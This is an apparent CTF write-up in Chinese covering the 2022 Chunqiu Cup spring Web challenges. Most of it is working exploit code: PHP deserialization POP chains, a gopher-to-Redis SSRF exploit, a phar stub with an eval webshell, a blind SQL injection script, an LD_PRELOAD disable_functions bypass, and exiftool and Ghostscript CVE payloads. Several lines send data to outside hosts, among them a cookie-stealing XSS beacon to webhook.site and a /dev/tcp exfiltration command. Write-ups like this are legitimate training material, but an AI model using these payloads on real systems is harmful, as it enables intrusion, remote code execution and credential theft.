# 【WP】2022年春秋杯春季赛Web类题目解析

> 原文: https://www.ctfiot.com/42191.html
> ID: 42191

easy-swoole

本题考察选手对构造php反序列化和利用gopher协议的能力。在Redis类中可以发现，数据是经过序列化之后存储到redis中的。

class Redis extends EasySwooleRedisRedis{
    public function __construct()
    {
        parent::
__construct(new EasySwooleRedisConfigRedisConfig([
            'host' => 'redis',
            'port' => '6379',
            'auth' => '123456',
            'serialize' => EasySwooleRedisConfigRedisConfig::
SERIALIZE_PHP
        ]));
    }
}

而在爬虫的代码中可以发现，没有对协议做任何过滤，因此我们可以通过gopher协议向redis中伪造一条序列化数据，在程序读取缓存时触发反序列化rce。

private static function make_request($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

反序列化的入口点选取了EasySwooleHttpMessageUploadFile，他的__destruct函数调用了$this->stream->close函数。同时观察到easyswoole依赖Prophecy，而Prophecy存在一条已知的利用链，该利用链从__call函数开始，正好衔接了之前的$this->stream->close，但是Prophecy这条利用链需要用到依赖中不存在的Faker，无法直接利用。最后用了phpunit中的PHPUnitFrameworkMockObjectMockTrait，它正好有一个generate方法，并且调用了eval，实现了RCE。

最后生成pop链的代码如下，由于swoole不同于fastcgi的运行方式，system函数无法直接输出到网页中，所以采取了抛出异常的方式来获取回显。

<?php

namespace EasySwooleHttpMessage{
    class UploadFile{
        public $stream;
        function __construct($stream){
            $this->stream = $stream;
        }
    }
}

namespace ProphecyProphecy{
    class ObjectProphecy{
        public $lazyDouble;
        public $revealer;
        function __construct($lazyDouble){
            $this->revealer = $this;
            $this->lazyDouble = $lazyDouble;
        }
    }
}

namespace ProphecyDoubler{
    class LazyDouble{
        public $doubler;
        public $argument;
        public $class;
        public $interfaces;
        function __construct($doubler){
            $this->doubler = $doubler;
            $this->class = null;
            $this->argument = [];
            $this->interfaces = [];
        }
    }
    class Doubler{
        public $mirror;
        public $creator;
        public $namer;
        public $patches;
        function __construct($creator){
            $this->namer = new NameGenerator();
            $this->mirror = new ProphecyDoublerGeneratorClassMirror();
            $this->creator = $creator;
            $this->patches = [];
        }
    }
    class NameGenerator{}
}

namespace ProphecyDoublerGenerator{
    class ClassMirror{}
    class ClassCreator{
        public $generator;
        function __construct($generator){
            $this->generator = $generator;
        }
    }
}

namespace PHPUnitFrameworkMockObject{
    class MockTrait{
        public $classCode;
        public $mockName;
        function __construct($code){
            $this->mockName = "";
            $this->classCode = $code;
        }
    }
}

namespace {
    $mockObject = new PHPUnitFrameworkMockObjectMockTrait('throw new ErrorException(shell_exec("/readflag"));');
    $classCreator = new ProphecyDoublerGeneratorClassCreator($mockObject);
    $doubler = new ProphecyDoublerDoubler($classCreator);
    $lazyDouble = new ProphecyDoublerLazyDouble($doubler);
    $objectProphecy = new ProphecyProphecyObjectProphecy($lazyDouble);
    $message = new EasySwooleHttpMessageUploadFile($objectProphecy);
    echo base64_encode(serialize($message));
}

将生成的pop链写入到redis中，并将写入流量转换成gopher协议，最终利用exp如下

import sys
import requests
import re

if len(sys.argv) < 2:
    print(sys.argv[0]+" target-ip:
port")
    exit()

url = "http://"+sys.argv[1]+"/crawler"
data = "gopher://redis:
6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"

r = requests.get(url,params={"url":
data})
# print(r.text)
r = requests.get(url,params={"url":"http://exp"})
r = re.findall(r'(flag{[0-9a-f-]+})',r.text)
print(r[0])

signin-service

难点主要在于前面考察选手对于promise的熟悉程度，知道可以通过某种手段使其阻塞，并灵活的分析题目源码，到达越权的效果。后面xss的部分是客户端原型链污染配合了一个dom xss 就算是比较简单了。

先自己随便注册个号，然后运行命令

curl http://127.0.0.1/user/change -H "Content-Type: application/json" -H "Cookie: ctf=这里是你自己的值" -d '{"bio":"sss","username":"admin","op":"UPP.save"}'

接着访问/user/home可以看到自己的名字成功的改成了admin

接下来使用常用的md5脚本跑个验证码

import hashlib

for i in range(0,10485760):
 m = hashlib.md5()
 b = str(i).encode(encoding='utf-8')
 m.update(b)
 md = m.hexdigest()
 
 if md[0:6] == '7c0d5f':
   print(i)
   break

输入验证码和payload如下

__proto__[tagReplacementText]=&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)

webhook拿flag就行了

sql_debug

根据源码中install.php的内容可以发现配置文件写入和tmp下文件写入

在控制器目录中可以发现Test控制器 只有一个sql注入的地方

实测也失败（因为环境里没有mysql

数据库配置可控的情况下尝试使用恶意mysql服务器读取文件 发现失败 无法连接到远程服务器

PHP内核审计

我们分析php内核源码可以发现ext/pdo/pdo_dbh.c的dsn_from_uri函数存在php_stream_open_wrapper函数 也就是可以触发phar反序列化。

查找调用可以发现dsn_from_uri在ext/pdo/pdo_dbh.c的PHP_METHOD函数中被调用,调用条件是uri:开头

查看实现方法发现是是PDO的__construct构造方法

本次测试代码发现dsn字符串中uri设置为phar即可触发phar反序列化

<?php
include_once "classTest.php";

$dbms='mysql';     //数据库类型
$host='localhost'; //数据库主机名
$dbName='test';    //使用的数据库
$user='root';      //数据库连接用户名
$pass='';          //对应的密码
$dsn="uri:
phar://phar.phar/$dbms:
host=$host;dbname=$dbName";

try {
    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
    echo "连接成功
";
    $dbh = null;
} catch (PDOException $e) {
    die ("Error!: " . $e->getMessage() . "
");
}
$db = new PDO($dsn, $user, $pass, array(PDO::
ATTR_PERSISTENT => true));

?>

所以本题需要先挖掘php反序列化链

Nette框架POP链

文件包含

搜索入口可以找到Selection类

跟进发现需要先满足一个if判断，其中需要关注getSelect和getGeneralCacheKey方法

getSelect方法直接返回数据

getGeneralCacheKey方法也返回数据

寻找load方法时在namespace NetteDIConfigAdapters的PhpAdapter类中发现文件包含  我们可以在写phar到/tmp/install.lock 随后反序列化包含 执行rce

构造链如下:

<?php

namespace NetteDIConfigAdapters{
    class PhpAdapter{
    }
}
namespace NetteDatabaseTable {

    use NetteDIConfigAdaptersPhpAdapter;

    class SqlBuilder
    {
    }

    class Selection
    {
        protected $observeCache;
        protected $sqlBuilder;
        protected $accessedColumns;
        protected $previousAccessedColumns;
        protected $generalCacheKey;
        protected $cache;

        public function __construct()
        {
            $this->observeCache = $this;
            $this->cache = new PhpAdapter();
            $this->sqlBuilder = new SqlBuilder();
            $this->accessedColumns = "1";
            $this->generalCacheKey = "/etc/passwd"; //需要包含的文件
            $this->previousAccessedColumns = "222";
        }
    }
}

namespace {

    use NetteDatabaseTableSelection;
    $poc = new Selection();
    echo urlencode(serialize($poc));
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($poc); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
}

本地修改下源码测试pop链可以打通

接下来我们把phar修改一下上传

<?php

namespace NetteDIConfigAdapters{
    class PhpAdapter{
    }
}
namespace NetteDatabaseTable {

    use NetteDIConfigAdaptersPhpAdapter;

    class SqlBuilder
    {
    }

    class Selection
    {
        protected $observeCache;
        protected $sqlBuilder;
        protected $accessedColumns;
        protected $previousAccessedColumns;
        protected $generalCacheKey;
        protected $cache;

        public function __construct()
        {
            $this->observeCache = $this;
            $this->cache = new PhpAdapter();
            $this->sqlBuilder = new SqlBuilder();
            $this->accessedColumns = "1";
            $this->generalCacheKey = "/tmp/install.lock"; //需要包含的文件
            $this->previousAccessedColumns = "222";
        }
    }
}

namespace {

    use NetteDatabaseTableSelection;
    $poc = new Selection();
//    echo urlencode(serialize($poc));
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php eval($_REQUEST[0]);__HALT_COMPILER(); ?>"); //shell放在stub前面
    $phar->setMetadata($poc); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "123"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    echo urlencode(serialize(file_get_contents("phar.phar")));

}

GET /install.php?ip=127.0.0.1&content=s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&step=2&action=%E5%AE%89%E8%A3%85 HTTP/1.1
Host: 127.0.0.1:
888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _nss=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

随后写入配置文件

GET /install.php?type=uri:
phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
Host: 127.0.0.1:
888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:
888/install.php
Cookie: _nss=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

访问test路径触发phar反序列化 执行命令获取flag

sql_ctfer

sql注入，编写python代码：

import xlwt
import requests
import time
url="http://IP:
PORT/index.php?id=1%27"
def write_execl(ord_id):
 wb = xlwt.Workbook();
 ws = wb.add_sheet("sheet1")
 ws.write(0,0,ord_id)
 ws.write(0,1,'b')
 ws.write(0,2,'c')
 wb.save("ok.xls")
def sqli():
 flag=''
 sql_str="abcdeflagQWERTYUIOPASDFGHJKLZXCVBNM1234567890-{}"
 for i in range(1,20):
  for s in sql_str:
   startTime=time.time()
   sql_payload="123123' oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )='{}') then sleep(5) else 1 end -- a".format(i,s)
   print(sql_payload)
   write_execl(sql_payload)
   file={'file':
open('ok.xls','rb')}
   r=requests.post(url,files=file)
   if time.time()-startTime>4:
    print(s)
    flag=flag+s
    break
 print(flag)
sqli()

easy_php

打开题目，发现是一个unpack数据处理，存在三个函数的调用

首先尝试构造phpinfo 只需要处理一下pack的格式就好  这里先写了一个自动构造pack的php文件

<?php
function request_by_curl($remote_server, $post_string) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $remote_server);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
  curl_setopt($ch, CURLOPT_USERAGENT, "");
  $data = curl_exec($ch);
  curl_close($ch);
}

function go($func,$args){
  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
}
request_by_curl('http://127.0.0.1/index.php', go($_GET['cmd'],$_GET['args']));
?>

# http://127.0.0.1/poc.php?cmd=phpinfo&args=-1

在phpinfo发现添加了ctf模块

查看php.ini寻找插件名称

根据插件目录/usr/local/lib/php/extensions/no-debug-non-zts-20190902读取php模块

下载so

随后使用ida反编译搜索关键字ctf找到对应反序列化函数 发现__destruct函数存在恶意操作

条件为md5相等且字符串不相等 基础的数组绕过就好  绕过后发现获取cmd和args参数并传给zephir_call_class_method_aparams函数

该函数调用了当前类的call_back方法

跟进call_back方法发现对传入的数据进行了提取

如果输入的cmd长度小于12则进行变量调用$cmd($args)

否则把args解码后放入create_function

结合前面发现的disable_function 和ope_basedir直接LDPRELOAD绕过

编写poc 恶意类 任意代码执行

<?php
namespace Ctf{
    class Treeting{
        private $token;
        private $key;
        private $cmd;
        private $args;
        function __construct(){
            $this->token = array(1);
            $this->key = array(2);
            $this->cmd = "var_dumpvar_dump";
            $this->args = base64_encode('2;}eval($_GET[0]);/*');
        }
    }
}

namespace{
    $a = new CtfTreeting();
    $poc =  serialize($a);
    $poc = str_replace("T","G",$poc);
    echo urlencode($poc);
    // unserialize($poc);
}
# O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D

因为没有ban掉putenv和mail 所以我们直接执行命令把flag写到tmp下读出来

#define _GNU_SOURCE
#include <stdlib.h>
#include 
#include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
 const char* cmdline = getenv("CMD");
 system(cmdline);
}

<?php
function request_by_curl($remote_server, $post_string) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $remote_server);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
  curl_setopt($ch, CURLOPT_USERAGENT, "");
  $data = curl_exec($ch);
  curl_close($ch);
}

function go($func,$args){
  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
}
// $poc = <<< EOF
// copy("http://20.1.1.189:
999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
// EOF;
$poc = <<< EOF
putenv("CMD=/readflag>/tmp/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");include('/tmp/flag');
EOF;

request_by_curl('http://127.0.0.1:
888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
?>

发送数据包

GET /poc.php?cmd=unserialize&args=O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP/1.1
Host: 0.0.0.0:
800
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: tracy-session=436e349820; _nss=1; PHPSESSID=3jn67ujcvbcurso8cli2grh670
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

picture_convert_plus

题目给了源码，可以看到 exiftool 的版本是 12.23，也就是存在CVE-2021-22204

直接搜索这个cve生成一个poc后，发现里面是存在字符串 metadata 的

https://github.com/bilkoh/POC-CVE-2021-22204/blob/main/build_image.pl

然后查看相关的漏洞源码，可以看到进入漏洞触发点的正则除了metadata，还有xmp可以利用，详细分析可以参考https://www.anquanke.com/post/id/266606

修改构造脚本为:

#!/usr/bin/perl
use strict;
use warnings;

my $poc_imgfile = 'notevil.jpg';
my $outfile = 'ant.out';
my $djvumake = "djvumake $poc_imgfile INFO=0,0 BGjp=/dev/null ANTa=$outfile";

sub usage {
    print "POC-CVE-2021-22204n";
    print "Usage $0 <cmd to inject> n";
    print "tNote: if your cmd contains unix special characters use quote!n";
    print "tEG: $0 "curl xxxx.com/script.sh|sh"n";
    print "This poc generates an image file ($poc_imgfile) to be proccessed by vulnerable exiftool.n";
    print "And requires DjVuLibre to be installed and in PATHn";
    print "t See: http://djvu.sourceforge.net/n";
    print "---nn";
}

sub main {
    # search args for cmd to inject
    my $args = join(' ', @ARGV);
    my $cmd = $args || 'curl http://google.com';

    print "[+] Preparing annotation file.n";
    open(FH, '>', $outfile) or die $!;
    while (<DATA>) {
        s/##/$cmd/;
        print FH $_;
    }
    close(FH);

    print "[+] Creating image file with: $djvumake n";
    system($djvumake);

    # remove file
    unlink $outfile;

    print "[+] $poc_imgfile created.n";
}

usage();
main();

__DATA__
(xmp"
".`/bin/bash -c '##'`;#"

反弹shell后，读取第一部分flag，然后在查看gs的版本，所以利用GPL Ghostscript 9.50(CVE-2021-3781)的漏洞

CVE-2021-3781的利用脚本，但是过滤了tmp和&#也就不能直接利用了

https://github.com/duc-nt/RCE-0-day-for-GhostScript-9.50/blob/main/IM-RCE-via-GhostScript-9.5.py

这个时候下载相应版本的代码，代码审计后发现绕过方式有两种，第一种处理部分绕过的具体代码如下，他遇到 时会判断后面字符是否可以转义或者是8进制字符串，不然就省略符号

https://github.com/ArtifexSoftware/ghostpdl/archive/refs/tags/ghostscript-9.50.zip

第二种利用根据源码分析一下，这里就是主要处理pipe的代码块

最终会进入的路径的匹配逻辑，如果匹配成功，那就可以执行popen

但是为什么要是/tmp/开头呢？从下面的代码可以知道，比如一个/tmp/*就代表通配符了主要是/tmp/开头的都可以进入匹配，如果是*的就会进入一些字符限制的匹配，所以目标就是找一下哪些匹配路径里面有*

这种格式一看就是通过偏移取的值，所以rax就是整个字符串数组的指针，然后挨着遍历一下所有的字符串

可以发现很多的路径里面都有*，所以我们可以通过其他的路径构造进行绕过copies (%pipe%%rom%lib/curl http://127.0.0.1:
2333/) (r) file showpage 0 quit，发现可以成功打通

最终构造得到第二部分的poc：

import requests

url = "http://eci-???.cloudeci1.ichunqiu.com:
8888/"
convert_url = "/convert"
hack_ip = "vps_ip"
res = requests.session()

get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc>  <svg width="1px" height="1px" /> </hui>"""
res.post(url+"/upload",files={"file":
get_flag2})
res.get(url+convert_url)

晋升之路

打开题目发现storge.js,得到所有的请求方法

发现cookie使用jwt

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，春秋GAME团队将春秋杯春季赛题目部署到i春秋CTF大本营的“2022年春秋杯网络安全联赛春季赛”，欢迎各位师傅交流讨论。
https://www.ichunqiu.com/competition

相关阅读

2022年春秋杯春季赛落幕，伽玛号战舰将奔赴下一星宇！

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426


```
class Redis extends EasySwooleRedisRedis{
    public function __construct()
    {
        parent::
__construct(new EasySwooleRedisConfigRedisConfig([
            'host' => 'redis',
            'port' => '6379',
            'auth' => '123456',
            'serialize' => EasySwooleRedisConfigRedisConfig::
SERIALIZE_PHP
        ]));
    }
}
private static function make_request($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
<?php

namespace EasySwooleHttpMessage{
    class UploadFile{
        public $stream;
        function __construct($stream){
            $this->stream = $stream;
        }
    }
}

namespace ProphecyProphecy{
    class ObjectProphecy{
        public $lazyDouble;
        public $revealer;
        function __construct($lazyDouble){
            $this->revealer = $this;
            $this->lazyDouble = $lazyDouble;
        }
    }
}

namespace ProphecyDoubler{
    class LazyDouble{
        public $doubler;
        public $argument;
        public $class;
        public $interfaces;
        function __construct($doubler){
            $this->doubler = $doubler;
            $this->class = null;
            $this->argument = [];
            $this->interfaces = [];
        }
    }
    class Doubler{
        public $mirror;
        public $creator;
        public $namer;
        public $patches;
        function __construct($creator){
            $this->namer = new NameGenerator();
            $this->mirror = new ProphecyDoublerGeneratorClassMirror();
            $this->creator = $creator;
            $this->patches = [];
        }
    }
    class NameGenerator{}
}

namespace ProphecyDoublerGenerator{
    class ClassMirror{}
    class ClassCreator{
        public $generator;
        function __construct($generator){
            $this->generator = $generator;
        }
    }
}

namespace PHPUnitFrameworkMockObject{
    class MockTrait{
        public $classCode;
        public $mockName;
        function __construct($code){
            $this->mockName = "";
            $this->classCode = $code;
        }
    }
}

namespace {
    $mockObject = new PHPUnitFrameworkMockObjectMockTrait('throw new ErrorException(shell_exec("/readflag"));');
    $classCreator = new ProphecyDoublerGeneratorClassCreator($mockObject);
    $doubler = new ProphecyDoublerDoubler($classCreator);
    $lazyDouble = new ProphecyDoublerLazyDouble($doubler);
    $objectProphecy = new ProphecyProphecyObjectProphecy($lazyDouble);
    $message = new EasySwooleHttpMessageUploadFile($objectProphecy);
    echo base64_encode(serialize($message));
}
import sys
import requests
import re

if len(sys.argv) < 2:
    print(sys.argv[0]+" target-ip:
port")
    exit()

url = "http://"+sys.argv[1]+"/crawler"
data = "gopher://redis:
6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"

r = requests.get(url,params={"url":
data})
# print(r.text)
r = requests.get(url,params={"url":"http://exp"})
r = re.findall(r'(flag{[0-9a-f-]+})',r.text)
print(r[0])
curl http://127.0.0.1/user/change -H "Content-Type: application/json" -H "Cookie: ctf=这里是你自己的值" -d '{"bio":"sss","username":"admin","op":"UPP.save"}'
import hashlib

for i in range(0,10485760):
 m = hashlib.md5()
 b = str(i).encode(encoding='utf-8')
 m.update(b)
 md = m.hexdigest()
 
 if md[0:6] == '7c0d5f':
   print(i)
   break
__proto__[tagReplacementText]=&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
<?php
include_once "classTest.php";

$dbms='mysql';     //数据库类型
$host='localhost'; //数据库主机名
$dbName='test';    //使用的数据库
$user='root';      //数据库连接用户名
$pass='';          //对应的密码
$dsn="uri:
phar://phar.phar/$dbms:
host=$host;dbname=$dbName";

try {
    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
    echo "连接成功
";
    $dbh = null;
} catch (PDOException $e) {
    die ("Error!: " . $e->getMessage() . "
");
}
$db = new PDO($dsn, $user, $pass, array(PDO::
ATTR_PERSISTENT => true));

?>
<?php

namespace NetteDIConfigAdapters{
    class PhpAdapter{
    }
}
namespace NetteDatabaseTable {

    use NetteDIConfigAdaptersPhpAdapter;

    class SqlBuilder
    {
    }

    class Selection
    {
        protected $observeCache;
        protected $sqlBuilder;
        protected $accessedColumns;
        protected $previousAccessedColumns;
        protected $generalCacheKey;
        protected $cache;

        public function __construct()
        {
            $this->observeCache = $this;
            $this->cache = new PhpAdapter();
            $this->sqlBuilder = new SqlBuilder();
            $this->accessedColumns = "1";
            $this->generalCacheKey = "/etc/passwd"; //需要包含的文件
            $this->previousAccessedColumns = "222";
        }
    }
}

namespace {

    use NetteDatabaseTableSelection;
    $poc = new Selection();
    echo urlencode(serialize($poc));
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($poc); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
}
<?php

namespace NetteDIConfigAdapters{
    class PhpAdapter{
    }
}
namespace NetteDatabaseTable {

    use NetteDIConfigAdaptersPhpAdapter;

    class SqlBuilder
    {
    }

    class Selection
    {
        protected $observeCache;
        protected $sqlBuilder;
        protected $accessedColumns;
        protected $previousAccessedColumns;
        protected $generalCacheKey;
        protected $cache;

        public function __construct()
        {
            $this->observeCache = $this;
            $this->cache = new PhpAdapter();
            $this->sqlBuilder = new SqlBuilder();
            $this->accessedColumns = "1";
            $this->generalCacheKey = "/tmp/install.lock"; //需要包含的文件
            $this->previousAccessedColumns = "222";
        }
    }
}

namespace {

    use NetteDatabaseTableSelection;
    $poc = new Selection();
//    echo urlencode(serialize($poc));
    @unlink("phar.phar");
